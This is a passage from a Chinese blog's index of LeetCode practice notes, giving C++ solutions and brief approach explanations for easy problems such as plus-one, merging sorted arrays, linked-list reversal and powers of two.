}};","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%932/"},{"title":"LeetCode-3","text":"58. 最后一个单词的长度AC代码1234567891011class Solution {public: int lengthOfLastWord(string s) { reverse(s.begin(), s.end()); stringstream ss(s); string buf; ss &gt;&gt; buf; reverse(buf.begin(), buf.end()); return buf.length(); }}; 1234567891011class Solution {public: int lengthOfLastWord(string s) { int count = 0; for (int i = s.length() -1 ; i &gt;= 0; i--) { if (s[i] != ' ')count++; else if (count &gt; 0) break; } return count; }}; 66. 加一思路写一个模拟加法的算法就可以。假设加0，第一次carry（进位）为1 AC代码1234567891011121314151617181920static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: vector&lt;int&gt; plusOne(vector&lt;int&gt;&amp; digits) { int carry = 1; int i = digits.size(); while (i &amp;&amp; carry) { int t = digits[i-1] + carry; digits[i-1] = t%10; carry = t/10; i--; } if (carry) digits.insert(digits.begin(), carry); return digits; }}; 67. 二进制求和AC代码123456789101112131415161718class Solution {public: string addBinary(string a, string b) { if (a.length() &gt; b.length()) { b.insert(0, a.length() - b.length(), '0'); } else if (a.length() &lt; b.length()){ a.insert(0, b.length() - a.length(), '0'); } int carry = 0; for (int i = a.length() - 1; i &gt;= 0; i--) { int n = a[i] + b[i] + carry - '0'*2; a[i] = n % 2 + '0'; carry = n/2; } if (carry) a.insert(0, 1, carry + '0'); return a; }}; 69. x 的平方根AC代码123456class Solution {public: int mySqrt(int x) { return sqrt(x); }}; 思路暴力求解 12345678910111213141516171819class Solution {public: int mySqrt(int x) { if (x &lt;= 0) return 0; long long cmp = 0; long long i = 0; while (cmp &lt;= x) { i++; cmp = i*i; if (i &gt; INT_MAX) { i = INT_MIN; } if (i &lt; INT_MIN) { i = INT_MAX; } } return i - 1; }}; 思路牛顿迭代法xn+1 = xn - f(xn) / f’(xn); AC代码12345678910111213141516171819class Solution {public: double fx(double x,double n) { return x*x - n; } double dfxdx(double x) { return 2*x; } int mySqrt(int n) { double x = 0.01; double exp = 0.01; double temp = 1; while (fabs(x - temp) &gt; exp) { temp = x; x = x - fx(x, n)/dfxdx(x); } return x; }}; 88. 合并两个有序数组思路遍历nums2，对于每一个元素，查找比它大的元素，插入 AC代码12345678910111213class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { int count = 0; for (int i = 0, j = 0; i &lt; nums2.size(); i++) { while (j &lt; m &amp;&amp; nums2[i] &gt; nums1[j])j++; nums1.insert(nums1.begin() + j, nums2[i]); count++; m++; } nums1.erase(nums1.end() - count, nums1.end()); }}; 思路三个指针a，b，c，分别指向m+n-1,m-1,n-1 a开始向前遍历，比较另外两个指针的值，把较大的那个赋值给a，然后较大的指针前移 AC代码12345678910111213141516171819202122232425262728class Solution {public: void merge(vector&lt;int&gt;&amp; nums1, int m, vector&lt;int&gt;&amp; nums2, int n) { if (!m) { for (int i = 0; i &lt; n; i++) { nums1[i] = nums2[i]; } return; } if (!n) return; int i = n + m - 1, j = m - 1, k = n - 1; while (j &gt;= 0 &amp;&amp; k &gt;= 0) { nums1[i--] = nums1[j] &gt; nums2[k] ? nums1[j--] : nums2[k--]; } if (j != - 1) { while (j &gt;= 0) { nums1[i--] = nums1[j--]; } } if (k != - 1) { while (k &gt;= 0) { nums1[i--] = nums2[k--]; } } }}; 100. 相同的树真没想到从来没接触过树的我居然一遍过了 思路深度优先遍历，先递归调用，访问所有节点 遇到结束时，为null，则比较两个是不是都是null，如果不是，说明树的形状不一样 叶子节点返回后，比较上一节点的值，相同返回true，最后达到函数结尾的一律返回false（值不一样或者形状不一样） AC代码123456789101112131415161718192021/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: bool isSameTree(TreeNode* p, TreeNode* q) { if (p == NULL || q == NULL) return q == p; if (isSameTree(p-&gt;left, q-&gt;left) &amp;&amp; isSameTree(p-&gt;right, q-&gt;right)) { if (p-&gt;val == q-&gt;val) { return true; } } return false; }}; 21. 合并两个有序链表思路跟88. 合并两个有序数组的思路是一样样的，不过由于用指针，所以最后处理末尾数据的时候，可以直接把多出来的一截赋值给上一个节点的next AC代码123456789101112131415161718192021222324252627282930313233343536373839/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */static const auto __ = []() { ios::sync_with_stdio(false); cin.tie(nullptr); return nullptr;}();class Solution {public: ListNode* mergeTwoLists(ListNode* l1, ListNode* l2) { ListNode *head, *temp, *temp1; if (l1 == NULL) return l2; if (l2 == NULL) return l1; temp = head = new ListNode(0); while (l2 != NULL &amp;&amp; l1 != NULL) { if (l1-&gt;val &gt; l2-&gt;val) { temp-&gt;next = l2; l2 = l2-&gt;next; } else { temp-&gt;next = l1; l1 = l1-&gt;next; } temp = temp-&gt;next; } if (l1 != NULL) { temp-&gt;next = l1; } if (l2 != NULL) { temp-&gt;next = l2; } return head-&gt;next; }}; 118. 杨辉三角大一必会题，但是题解里说这个也属于动态规划 AC代码12345678910111213141516171819class Solution {public: vector&lt;vector&lt;int&gt;&gt; generate(int numRows) { vector&lt;vector&lt;int&gt;&gt; ans; for (int i = 0; i &lt; numRows; i++) { vector&lt;int&gt; line; for (int j = 0; j &lt; i + 1; j++) { if (j == 0 || j == i) { line.push_back(1); } else { line.push_back(ans[i-1][j] + ans[i-1][j-1]); } } ans.push_back(line); line.clear(); } return ans; }}; 119. 杨辉三角 II思路（空间复杂度为O(K)）的算法利用组合数的对称性 12345678910111213141516171819class Solution {public: vector&lt;int&gt; getRow(int rowIndex) { vector&lt;int&gt; ans(rowIndex + 1); for (int i = 0; i &lt; rowIndex+1; i++) { for (int j = 0; j &lt; i / 2 + 1; j++) { if (j == 0) { ans[j] = 1; } else { ans[j] = ans[j] + ans[i - j]; } } for (int j = i / 2 + 1; j &lt; i + 1; j++) { ans[i - (j - (i/2+1))] = ans[j - (i/2+1)]; } } return ans; }}; 121. 买卖股票的最佳时机思路画出售价的时间 - 价格图，关注波峰和波谷如果现在的值小于当前的最小值，则把当前值作为最小值，如果大于最小值，那么计算当前值与最小值的差，如果大于当前利润，则作为最新利润。 AC代码1234567891011121314class Solution {public: int maxProfit(vector&lt;int&gt;&amp; prices) { int min = INT_MAX; int profit = 0; for (int i = 0; i &lt; prices.size(); i++) { if (prices[i] &lt; min) min = prices[i]; else if (profit &lt; prices[i] - min) profit = prices[i] - min; } return profit; }}; 122. 买卖股票的最佳时机 II思路找相邻波峰和波谷，波谷买入，波峰售出大循环遍历数组，内层第一个循环找波谷，下一个循环找波峰然后波峰波谷相减，加到profit上 1234567891011121314151617class Solution {public: int maxProfit(vector&lt;int&gt;&amp; prices) { if (!prices.size()) return 0; int i = 0, peak, valley, profit = 0; for (; i &lt; prices.size() - 1; ) { while (i &lt; prices.size() - 1 &amp;&amp; prices[i] &gt;= prices[i + 1]) i++; valley = prices[i]; while (i &lt; prices.size() - 1 &amp;&amp; prices[i] &lt;= prices[i + 1]) i++; peak = prices[i]; profit += peak - valley; } return profit; }}; 136. 只出现一次的数字思路利用异或运算的性质（同为0，不同为1） AC代码12345678910class Solution {public: int singleNumber(vector&lt;int&gt;&amp; nums) { int n = 0; for (auto num : nums) { n ^= num; } return n; }}; 125. 验证回文串思路把是字符的存起来，然后复制反转一份，然后比较 AC代码1234567891011121314class Solution {public: bool isPalindrome(string s) { string temp, cmp; for(int i = 0; i &lt; s.length(); i++) { if(isalpha(s[i]) || isdigit(s[i])) { temp += tolower(s[i]); cmp += tolower(s[i]); } } reverse(cmp.begin(), cmp.end()); return cmp == temp; }}; 141. 环形链表哈希表12345678910111213141516171819202122/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: bool hasCycle(ListNode *head) { map&lt;ListNode*, int&gt; m; ListNode* temp = head; while (temp != NULL) { if (m[temp] &gt;= 2) { return true; } m[temp]++; temp = temp-&gt;next; } return false;}; 思路双指针一个指针一次后移一个，一个指针后移两次，如果快的那个先到终点，说明没有环，如果快的追上，慢的，说明一定有环 1234567891011121314151617class Solution {public: bool hasCycle(ListNode *head) { ListNode *slow, *fast; slow = fast = head; while (slow != NULL) { slow = slow-&gt;next; if (fast != NULL &amp;&amp; fast-&gt;next != NULL) fast = fast-&gt;next-&gt;next; else break; if (slow == fast) { return true; } } return false; }}; 155. 最小栈AC代码12345678910111213141516171819202122232425262728293031323334353637class MinStack {public: /** initialize your data structure here. */ vector&lt;int&gt; data; multiset&lt;int&gt; min; MinStack() { } void push(int x) { data.push_back(x); min.insert(x); } void pop() { min.erase(find(min.begin(), min.end(), *(data.end() - 1))); data.erase(data.end() - 1); } int top() { return *(data.end() - 1); return 0; } int getMin() { return *(min.begin()); return 0; }};/** * Your MinStack object will be instantiated and called as such: * MinStack obj = new MinStack(); * obj.push(x); * obj.pop(); * int param_3 = obj.top(); * int param_4 = obj.getMin(); */ AC代码12345678910111213141516171819202122232425262728293031class MinStack {public: stack&lt;int&gt; data; stack&lt;int&gt; min; MinStack() { } void push(int x) { data.push(x); if (min.empty() || x &lt;= min.top()) {//要等号 min.push(x); } } void pop() { int p = data.top(); data.pop(); if (p == min.top()) { min.pop(); } } int top() { return data.top(); } int getMin() { return min.top(); }}; 160. 相交链表思路双指针 两个指针，初始化分别指向链表A、B 如果两个指针不相等，一直循环以下动作 AB指针各自向后移动一格 当某一个指针到大末尾时，指向对方链表的头 最后循环退出，如果结果是NULL表示没有相交 AC代码123456789101112131415161718192021222324252627/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) { ListNode *l1 = headA, *l2 = headB; while (l1 != l2) { if (l1 != NULL) { l1 = l1-&gt;next; } else { l1 = headB; } if (l2 != NULL) { l2 = l2-&gt;next; } else { l2 = headA; } } return l1; }}; 167. 两数之和 II - 输入有序数组思路双指针一个指向开头，一个指向结束相加大于target，后面的前移相加小于target，前面的后移等于，返回下标 AC代码12345678910111213class Solution {public: vector&lt;int&gt; twoSum(vector&lt;int&gt;&amp; numbers, int target) { int i = 0, j = numbers.size() - 1; vector&lt;int&gt; &amp;v = numbers; while (i &lt; j) { if (v[i] + v[j] &gt; target) j--; else if (v[i] + v[j] &lt; target) i++; else return {i + 1, j + 1}; } return {}; }}; 168. Excel表列名称思路递归 首先n-- 如果n在0 - 25，返回对应字母 否则先返回n%26的对应的字母，再返回n/26+1对应的字母 ps：写完看了评论才反应过来，是转换26进制的问题，手动笑哭 AC代码1234567891011121314class Solution {public: string convertToTitle(int n) { string ans; n--; if (n / 26 &gt; 0) { ans += convertToTitle(n/26); ans += convertToTitle(n%26 + 1); } else { return string(1 ,(char)('A' + n)); } return ans; }};","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%933/"},{"title":"LeetCode-4","text":"172. 阶乘后的零思路把2，5的倍数拆成2，5，数5的个数（2一定比5多），这样5一定和2配对，所以5的个数就是末尾0的个数 AC代码1234567891011class Solution {public: int trailingZeroes(int n) { int ans = 0; while (n) { n /= 5; ans += n; } return ans; }}; 123456class Solution {public: int trailingZeroes(int n) { return n == 0 ? 0 : n/5 + trailingZeroes(n / 5); }}; 189. 旋转数组思路（递归） k %= nums.size();取余数，不要循环好多圈 把前k个数和后k个数交换 把从下标k到结束的数作为源数据调用本函数 AC代码1234567891011121314151617181920212223class Solution {public: void rotate(vector&lt;int&gt;&amp; nums, int k) { go(0, k, nums); /* 时间复杂度O(n^2/k) 空间复杂度O(1) */ } void go(int beg, int k, vector&lt;int&gt;&amp; nums) { k %= nums.size() - beg; if (k == 0) return; for (int i = beg; i &lt; beg + k; i++) { swap(nums[i], nums[nums.size() - k + i - beg]); } go(beg + k, k, nums); } void swap(int&amp; a, int&amp; b) { int t = a; a = b; b = t; }}; 思路 把整个数组反转一次 前0到k-1反转一次 后k到结束反转一次 AC代码12345678910111213141516171819202122class Solution {public: void rotate(vector&lt;int&gt;&amp; nums, int k) { int n = nums.size(); k %= n; reverse(nums, 0, n - 1); reverse(nums, 0, k - 1); reverse(nums, k, n - 1); /* 时间复杂度O(n) 空间复杂度O(1) */ /*------------------------------*/ } void reverse(vector&lt;int&gt;&amp; nums, int begin, int end) { while (begin &lt; end) { int n = nums[begin]; nums[begin++] = nums[end]; nums[end--] = n; } }}; 190. 颠倒二进制位思路 循环模2，2进制转2进制 注意原来的数的前导0也要添加到后面，所以循环条件是循环次数32次（因为给的是32位无符号数） AC代码1234567891011121314class Solution {public: uint32_t reverseBits(uint32_t n) { uint32_t ans = 0; int i = 32; while (i--) { ans *= 2; ans += n % 2; n /= 2; } return ans; }}; 191. 位1的个数AC代码1234567891011class Solution {public: int hammingWeight(uint32_t n) { int c = 0; while (n) { if (n % 2 == 1)c++; n/=2; } return c; }}; 202. 快乐数思路 计算，看有没有重复，有重复就说明不是快乐数 计算，出现4就不是快乐数（不是快乐数的数称为不快乐数（unhappy number），所有不快乐数的数位平方和计算，最後都会进入 4 → 16 → 37 → 58 → 89 → 145 → 42 → 20 → 4 的循环中。） AC代码1234567891011121314151617181920class Solution {public: bool isHappy(int n) { map&lt;int, int&gt; m; while (n != 1) { m[n]++; if (m[n] &gt; 1) break; n = get(n); } return n == 1; } int get(int n) { int ans = 0; while (n) { ans += (n % 10) * (n % 10); n /= 10; } return ans; }}; AC代码1234567891011121314151617181920class Solution {public: bool isHappy(int n) { while (n != 1) { if (n == 4) { return false; } n = get(n); } return true; } int get(int n) { int ans = 0; while (n) { ans += (n % 10) * (n % 10); n /= 10; } return ans; }}; 203. 移除链表元素思路如果头结点是要删的元素，进行的操作不太一样，要单独考虑，然后进行后面的删除。评论区好多用c++的都不管内存泄漏。不是好习惯，坚决杜绝！ AC代码123456789101112131415161718192021222324252627282930/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* removeElements(ListNode* head, int val) { ListNode* move = head, *last = head; while (head != NULL &amp;&amp; head-&gt;val == val) { head = head-&gt;next; delete last; last = head; } move = head; while (move != NULL) { if (move-&gt;val == val){ last-&gt;next = move-&gt;next; delete move; } else { last = move; } move = last-&gt;next; } return head; }}; 204. 计数质数思路用筛法两个for循环把不是素数的都筛出来但是要提升性能: 忽略偶数 如果当前数已经算过了，就不要算 用bool的vector，bool一字节，比int短，也可以加速 AC代码1234567891011121314151617181920212223242526272829303132333435class Solution{ public: int countPrimes(int n) { if (n &lt;= 2) return 0; int count = 1; vector&lt;bool&gt; notPrime(n,0); for (int i = 3; i &lt; sqrt(n); i += 2) { if (notPrime[i] == 1)continue; for (int j = 3; j * i &lt;= n; j += 2) { notPrime[i * j] = 1; } } notPrime[0] = 1; notPrime[1] = 1; notPrime[3] = 0; notPrime[4] = 1; notPrime[5] = 0; notPrime[6] = 1; notPrime[7] = 0; notPrime[8] = 1; notPrime[9] = 1; for (int i = 1; i &lt; n; i += 2) { if (notPrime[i] == 0) count++; } return count; }}; 最快大佬的代码思路看不懂123456789101112131415161718192021222324252627282930313233class Solution {public: int countPrimes(int n) { if (n &lt; 3) return 0; size_t len = (n-2) &gt;&gt; 1; //cout &lt;&lt; len &lt;&lt; endl; vector&lt;char&gt; v(len, 0); int count = 1; uint i = 0; auto m = min(len, 0x7FFEuL); while (i &lt; m) { if (!v[i]) { ++count; uint p = (i &lt;&lt; 1) + 3; //if (p &lt; 0x10000) { uint pp = p * p; uint j = (pp - 3) &gt;&gt; 1; while(j &lt; len) { v[j] = true; j += p; } } ++i; } while (i &lt; len) { if (!v[i]) ++count; ++i; } return count; }}; 205. 同构字符串思路不太会，抄的评论区代码，但是要注意，一个字母a如果替换成b，就不能替换为c AC代码1234567891011121314151617181920212223static const int boost = [](){ ios::sync_with_stdio(false); cin.tie(nullptr); return 0;}();class Solution {public: bool isIsomorphic(string s, string t) { int alphabetS[256], alphabetT[256], num = 0; memset(alphabetS, 0, sizeof(alphabetS)); memset(alphabetT, 0, sizeof(alphabetT)); int len = s.length(); for (int pos = 0; pos &lt; len; pos++) { if(alphabetS[s[pos]] != alphabetT[t[pos]]) return false; else if (alphabetS[s[pos]] == 0) alphabetS[s[pos]] = alphabetT[t[pos]] = ++num; } return true; }}; 206. 反转链表思路 把结点全都存到数组里 递归，调用自己，再把头结点变成尾巴结点 AC代码1234567891011121314151617181920212223242526/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: ListNode* reverseList(ListNode* head) { vector&lt;ListNode*&gt; v; ListNode *temp = head; while (temp != NULL) { v.push_back(temp); temp = temp-&gt;next; } int len = v.size(); for (int i = 0; i &lt; len / 2; i++) { int swap = v[i]-&gt;val; v[i]-&gt;val = v[len - 1 - i]-&gt;val; v[len - 1 - i]-&gt;val = swap; } return head; }}; 12345678910class Solution {public: ListNode* reverseList(ListNode* head) { if (head == NULL || head-&gt;next == NULL) return head; ListNode *temp = reverseList(head-&gt;next); head-&gt;next-&gt;next = head; head-&gt;next = NULL; return temp; }}; 217. 存在重复元素思路 调用api，先sort，再调用unique，判断返回值是不是end()迭代器，是则没有重复 AC代码12345678class Solution {public: bool containsDuplicate(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); return unique(nums.begin(), nums.end()) != nums.end(); }}; 123456789101112class Solution {public: bool containsDuplicate(vector&lt;int&gt;&amp; nums) { sort(nums.begin(), nums.end()); int len = nums.size(); for (int i = 1; i &lt; len; i++) { if (nums[i - 1] == nums[i]) return true; } return false; }}; 225. 用队列实现栈思路queue是先进先出，stack是后进先出。 用deque实现 每次push的元素后，让队列循环pop出来再push回去，使得刚刚push的元素变成第一个 AC代码1234567891011121314151617181920212223242526class MyStack {public: queue&lt;int&gt; data; MyStack() { } void push(int x) { data.push(x); int len = data.size() - 1; while (len--) { data.push(data.front()); data.pop(); } } int pop() { int x = data.front(); data.pop(); return x; } int top() { return data.front(); } bool empty() { return data.empty(); }}; 1234567891011121314151617181920class MyStack {public: deque&lt;int&gt; data; MyStack() { } void push(int x) { data.push_front(x); } int pop() { int x = data.front(); data.pop_front(); return x; } int top() { return data.front(); } bool empty() { return data.empty(); }}; 226. 翻转二叉树思路 递归 深度优先 广度优先 AC代码12345678910111213141516171819202122232425/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode(int x) : val(x), left(NULL), right(NULL) {} * }; */class Solution {public: TreeNode* invertTree(TreeNode* root) { go(root); return root; } void go(TreeNode* root) { if (root == NULL) return; TreeNode* temp = root-&gt;left; root-&gt;left = root-&gt;right; root-&gt;right = temp;//广度优先 go(root-&gt;left); go(root-&gt;right); }}; 123456789101112class Solution {public: TreeNode* invertTree(TreeNode* root) { if (root == NULL) return root; TreeNode*left = invertTree(root-&gt;right);//深度优先 TreeNode*right = invertTree(root-&gt;left); root-&gt;right = right; root-&gt;left = left; return root; }}; 231. 2的幂思路 取2对数看是不是整数 利用二进制位运算 假设一个无符号数是全1的，那么它是2^k-1 假设2^k = n，那么只要一个数满足(n)&amp;(n-1) == 0，按位相与 AC代码123456class Solution {public: bool isPowerOfTwo(int n) { return (int)log2(n) == log2(n); }}; 1234567class Solution {public: bool isPowerOfTwo(int n) { if (n &gt; 0 &amp;&amp; ((n)&amp;(n-1)) == 0) return true; return false; }}; 232. 用栈实现队列思路 创建两个栈s、m，每次push存到s里面，然后再逐个弹出s中的元素压到m中（这个过程中s要先拷贝一份） 每次pop的时候，从m中pop，然后再逐个弹出m中的元素压到s中（这个过程中s要先拷贝一份） m用来对顶部元素操作，s来保持队形 AC代码123456789101112131415161718192021222324252627282930313233class MyQueue {public: stack&lt;int&gt; s; stack&lt;int&gt; m; MyQueue() { } void push(int x) { s.push(x); update(s,m); } void update(stack&lt;int&gt; a, stack&lt;int&gt;&amp; b) { int len = a.size(); while (!b.empty()){ b.pop(); } while (len--) { b.push(a.top()); a.pop(); } } int pop() { int x = m.top(); m.pop(); update(m,s); return x; } int peek() { return m.top(); } bool empty() { return m.empty(); }}; 234. 回文链表思路（暂时没有达到空间O(1)）vector存结点地址AC代码123456789101112131415161718192021222324/** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode(int x) : val(x), next(NULL) {} * }; */class Solution {public: bool isPalindrome(ListNode* head) { /*ListNode* temp = head; vector&lt;ListNode*&gt; v; while (temp != NULL) { v.push_back(temp); temp = temp-&gt;next; } int len = v.size(); for (int i = 0; i &lt; len / 2; i++) { if (v[i]-&gt;val != v[len - 1 - i]-&gt;val) return false; } return true;*/ }}; 292. Nim游戏思路巴什博奕，n%(m+1)!=0时，先手总是会赢的m为每次抽排的最大张数 AC代码123456class Solution {public: bool canWinNim(int n) { return n%4 != 0; }}; 242. 有效的字母异位词思路就是看每个字母的使用次数一不一样一个数组，记录字母的使用次数，最后次数一样就行。 AC代码1234567891011121314class Solution {public: bool isAnagram(string s, string t) { int a[26] = {0}, b[26] = {0}; for (int i = 0; i &lt; s.length(); i++) a[s[i] - 'a']++; for (int i = 0; i &lt; t.length(); i++) b[t[i] - 'a']++; for (int i = 0; i &lt; 26; i++) { if (a[i] != b[i]) return false; } return true; }}; 258. 各位相加###AC代码 123456789101112131415class Solution {public: int addDigits(int num) { while (num/10 != 0) { int ans = 0; while (num) { ans += num%10; num /= 10; } num = ans; } return num; return num == 0 ? 0 : num - 9 * ((num - 1) / 9) ; }}; 263. 丑数思路如果n % m == 0,说明n中至少有一个m的因数，循环n%m == 0时重复n /= m，可以去除所有的m的因数，根据这个思路，如果是丑数，把所有2，3，5的因数去除以后，就是1了 AC代码12345678910class Solution {public: bool isUgly(int num) { if (num &lt;= 0) return false; while (num%2 == 0) num /= 2; while (num%3 == 0) num /= 3; while (num%5 == 0) num /= 5; return num == 1; }}; 268. 缺失数字思路 0-n 11 个数中缺了一个，可以先算出等差数列的sum(0,n)，然后变量数组减去所有元素，最后的差就是缺少的元素 看不懂的位运算，异或抵消 AC代码1234567891011class Solution {public: int missingNumber(vector&lt;int&gt;&amp; nums) { int ans = nums.size(); ans = ans*(ans+1)/2; for (int x : nums) { ans -= x; } return ans; }}; 123456789101112class Solution {public: int missingNumber(vector&lt;int&gt;&amp; nums) { int sum = nums.size(); int len = sum; for (int i = 0; i &lt; len; i++) { sum ^= nums[i]; sum ^= i; } return sum; }}; 278. 第一个错误的版本思路暴力搜索不可取，二分查找保平安 AC代码12345678910111213141516171819202122// Forward declaration of isBadVersion API.bool isBadVersion(int version);class Solution {public: int firstBadVersion(int n) { long long mid , a = 1, b = n; if (isBadVersion(1)) return 1; while (a &lt;= b) { mid=a+(b-a)/2; bool bad, left, right; bad = isBadVersion(mid); left = isBadVersion(mid - 1); right = isBadVersion (mid + 1); if (bad &amp;&amp; !left) return mid; else if (bad &amp;&amp; right) b = mid - 1; else a = mid + 1; } if (isBadVersion(n)) return n; return -1; }}; 283. 移动零思路 冒泡排序的思想，不过条件换成左边的数是0，则交换一次 双指针，从左往右遍历 AC代码123456789101112131415class Solution {public: void moveZeroes(vector&lt;int&gt;&amp; nums) { int len = nums.size(); for (int i = len - 1; i &gt;= 0; i--) { for (int j = len - 2; j &gt;= 0; j--) { if (nums[j] == 0) { int temp = nums[j]; nums[j] = nums[j + 1]; nums[j + 1] = temp; } } } }}; 123456789101112131415class Solution {public: void moveZeroes(vector&lt;int&gt;&amp; nums) { int len = nums.size(); int pos = 0; for (int i = 0; i &lt; len; i++) { if (nums[i] != 0) { nums[pos++] = nums[i]; } } for (int i = pos; i &lt; len; i++) { nums[i] = 0; } }}; 290. 单词模式思路 建立两个map，验证映射是一一映射 如果当前值在a-&gt;b且b-&gt;a的映射都是空，那么添加这两个映射 如果有一个是存在的，看两个映射的结果与当前值是否相等，不相等返回false 循环安全结束，返回true AC代码1234567891011121314151617181920212223242526class Solution {public: bool wordPattern(string pattern, string str) { unordered_map&lt;char, string&gt; m; unordered_map&lt;string, char&gt; n; vector&lt;string&gt; strs; stringstream ss(str); string buf; while (ss &gt;&gt; buf) { strs.push_back(buf); } if (strs.size() != pattern.length()) return false; int len = pattern.length(); for (int i = 0; i &lt; len; i++) { if (m[pattern[i]] == &quot;&quot; &amp;&amp; n[strs[i]] == 0) { m[pattern[i]] = strs[i]; n[strs[i]] = pattern[i]; } else { if (m[pattern[i]] != strs[i] || n[strs[i]] != pattern[i]) { return false; } } } return true; }}; 303. 区域和检索 - 数组不可变思路题目保证数组不会改变，且要多次调用sumRange()，采用以下方法提高效率 类比数列的知识，创建一个vector，存放前i项和 在构造对象时，变量一遍数组O(N)，得到所有的前n项和 每次调用函数时，直接返回两个sj和si-1的差即可 为了减少if-else的执行，数据的第一个地方存一个0，这样返回sj+1 - si即可 AC代码1234567891011121314151617class NumArray {public: vector&lt;int&gt; s; NumArray(vector&lt;int&gt; nums) { int sum = 0; int len = nums.size(); s.push_back(0); for (int i = 0; i &lt; nums.size(); i++) { sum += nums[i]; s.push_back(sum); } } int sumRange(int i, int j) { return s[j + 1] - s[i]; }}; 326. 3的幂思路 看3^log3(n)取整 是否等于n本身 用到了数论的知识，3的幂次的质因子只有3，而所给出的n如果也是3的幂次，故而题目中所给整数范围内最大的3的幂次的因子只能是3的幂次，1162261467是3的19次幂，是整数范围内最大的3的幂次 AC代码1234567class Solution {public: bool isPowerOfThree(int n) { if (n &lt;= 0) return false; return (int)pow(3, round((log(n) / log(3)))) == n; }}; 123456class Solution {public: bool isPowerOfThree(int n) { return n &gt; 0 &amp;&amp; 1162261467%n == 0; }}; 342. 4的幂思路 看以log2(num)是否为偶数 查看二进制的所有奇数位，全是0即可（参见二进制转10进制公式，奇数为上的2的指数都是奇数） AC代码1234567class Solution { public: bool isPowerOfFour(long long num) { double n = log2(num); return (int)n == n ? (int)n % 2 == 0 : false; }}; 123456789class Solution { public: bool isPowerOfFour(long long num) { if (num &lt; 0 || num &amp; (num-1)){//check(is or not) a power of 2. return false; } return num &amp; 0x55555555;//check 1 on odd bits }}; 344. 反转字符串AC代码123456class Solution {public: void reverseString(vector&lt;char&gt;&amp; s) { reverse(s.begin(), s.end()); }}; 345. 反转字符串中的元音字母AC代码1234567891011121314151617181920212223242526272829class Solution {public://双指针法 string reverseVowels(string s) { int left = 0; int right = s.length() - 1; char m[128] = {0}; m['a'] = 1; m['e'] = 1; m['i'] = 1; m['o'] = 1; m['u'] = 1; m['A'] = 1; m['E'] = 1; m['O'] = 1; m['I'] = 1; m['U'] = 1; while (left &lt; right) { while (left &lt; right &amp;&amp; !m[s[left]]) left++; while (left &lt; right &amp;&amp; !m[s[right]]) right--; //加上left&lt;right的判断 条件，防止把换过来的字母换回去 char m = s[left]; s[left] = s[right]; s[right] = m; left++; right--; } return s; }}; 349. 两个数组的交集思路 先把两个数组排序去重，然后map记录出现次数，然后把出现次数大于1的挑出来作为返回值返回 AC代码12345678910111213141516171819202122class Solution {public: vector&lt;int&gt; intersection(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { unordered_map&lt;int, int&gt; m; vector&lt;int&gt; v; sort(nums1.begin(), nums1.end()); nums1.erase(unique(nums1.begin(), nums1.end()), nums1.end()); sort(nums2.begin(), nums2.end()); nums2.erase(unique(nums2.begin(), nums2.end()), nums2.end()); for (int x : nums1) { m[x]++; } for (int x : nums2) { m[x]++; } for (auto x : m) { if (x.second &gt; 1) v.push_back(x.first); } return v; }};","link":"/home/2019/02/12/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%934/"},{"title":"LeetCode-5","text":"350. 两个数组的交集 II思路 两个map分别统计在两个数组中一个元素的出现次数 把其中一个数组排序去重，然后查询两个map 取这个元素在两个数组里出现次数的最小值n，往ans里面push该元素n次 AC代码1234567891011121314151617181920212223class Solution {public: vector&lt;int&gt; intersect(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { map&lt;int, int&gt; v,n; vector&lt;int&gt; ans; for (int x : nums1) { v[x]++; } for (int x : nums2) { n[x]++; } sort(nums1.begin(), nums1.end()); nums1.erase(unique(nums1.begin(), nums1.end()), nums1.end()); for (int x : nums1) { if (v[x] &amp;&amp; n[x]) { int l = v[x] &gt; n[x] ? n[x] : v[x]; for (int i = 0; i &lt; l; i++) ans.push_back(x); } } return ans; }}; 大佬思路双指针法 两个数组排序 两个指针指向第0个元素 循环比较，如果某一个指针的元素小，指针后移，知道值相等时，push一次 大佬代码1234567891011121314151617181920212223242526class Solution {public: vector&lt;int&gt; intersect(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { sort(nums1.begin(), nums1.end()); sort(nums2.begin(), nums2.end()); int n1Size = nums1.size(); int n2Size = nums2.size(); int i = 0; int j = 0; vector&lt;int&gt; intersect; while((i &lt; n1Size) &amp;&amp; (j &lt; n2Size)) { if (nums1[i] &lt; nums2[j]) ++i; else if (nums1[i] &gt; nums2[j]) ++j; else { intersect.push_back(nums1[i]); ++i; ++j; } } return intersect; }}; 367. 有效的完全平方数思路自己没好好研究这题的算法 AC代码123456class Solution {public: bool isPerfectSquare(int num) { return (int)sqrt(num) == sqrt(num); }}; 大佬思路 自己写一个搞笑的mySqrt函数，用类似二分查找法实现，毕竟这道题的输入只有整数 暴力搜索 大佬代码123456789101112131415161718192021222324class Solution {public: bool isPerfectSquare(int num) { int sqrt = mySqrt(num); return sqrt*sqrt == num; } int mySqrt(int x) { int 